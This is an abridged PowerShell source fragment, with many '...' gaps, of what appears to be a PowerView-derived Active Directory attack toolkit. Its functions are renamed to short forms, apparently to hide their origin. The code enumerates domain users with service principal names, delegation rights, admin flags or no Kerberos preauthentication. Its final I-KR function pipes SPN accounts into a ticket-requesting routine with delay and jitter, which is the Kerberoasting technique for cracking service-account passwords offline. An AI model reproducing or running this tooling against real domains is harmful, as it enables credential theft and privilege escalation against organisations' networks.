    ...
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ...
            if ($PSBoundParameters['Credential']) {
                $DomainObject = G-Dom -Credential $Credential
            }
            else {
                $DomainObject = G-Dom
            }
        ...
        if (-not $PSBoundParameters['Server']) {
            try {
                ...
                elseif ($PSBoundParameters['Credential']) {
                    $BindServer = ((G-Dom -Credential $Credential).PdcRoleOwner).Name
                }
                else {
                    $BindServer = ((G-Dom).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[G-DS] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $BindServer = $Server
        ...
        $SearchString += $DN
        Write-Verbose "[G-DS] search string: $SearchString"
...
function G-Dom {
    ...
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            ...
            Write-Verbose '[G-Dom] Using alternate credentials for G-Dom'
            ...
            if ($PSBoundParameters['Domain']) {
                ...
                Write-Verbose "[G-Dom] Extracted domain '$TargetDomain' from -Credential"
            }
            ...
            try {
                ...
                Write-Verbose "[G-Dom] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            ...
            try {
                ...
                Write-Verbose "[G-Dom] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                ...
                Write-Verbose "[G-Dom] Error retrieving the current domain: $_"
            }
        }
    }
}
	...
	$RandNo = New-Object System.Random
        ...
        ForEach ($Object in $TargetObject) {
            ...
            try {
                ...
                Write-Warning "[G-DomSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
    ...
    PROCESS {
        ...
        if ($UserSearcher) {
            ...
            $Identity | Where-Object {$_} | ForEach-Object {
                ...
                elseif ($IdentityInstance -match '^CN=') {
                    ...
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        ...
                        Write-Verbose "[G-DomUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = G-DS @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[G-DomUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                ...
                elseif ($IdentityInstance.Contains('\')) {
                    ...
                    if ($ConvertedIdentityInstance) {
                        ...
                        Write-Verbose "[G-DomUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = G-DS @SearcherArguments
                    }
                }
                else {
            ...
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[G-DomUser] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[G-DomUser] Searching for users who can be delegated'
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[G-DomUser] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[G-DomUser] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[G-DomUser] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[G-DomUser] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[G-DomUser] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            ...
            Write-Verbose "[G-DomUser] filter string: $($UserSearcher.filter)"
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    ...
                    $User = C-LDAPP -Properties $_.Properties
            ...
            if ($Results) {
                try { $Results.dispose() }
                    ...
                    Write-Verbose "[G-DomUser] Error disposing of the Results object: $_"
                }
            }
...
function I-KR {
    ...
    PROCESS {
        ...
        G-DomUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | G-DomSPNTicket -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter
    }
